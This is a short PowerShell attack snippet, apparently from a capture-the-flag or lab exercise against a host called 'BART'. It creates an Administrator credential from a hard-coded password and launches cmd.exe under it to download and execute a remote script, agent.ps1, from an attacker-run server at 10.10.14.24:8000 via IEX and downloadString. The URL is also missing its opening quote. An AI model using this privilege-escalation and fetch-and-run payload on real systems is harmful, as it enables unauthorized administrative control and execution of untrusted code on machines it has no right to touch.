$secpasswd = ConvertTo-SecureString "3130438f31186fbaf962f407711faddb" -AsPlainText -Force 
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
$computer = "BART"
[System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe","/c echo IEX(New-Object Net.Webclient).downloadString(http://10.10.14.24:8000/agent.ps1') | powershell.exe -noprofile -", $mycreds.Username, $mycreds.Password, $computer)
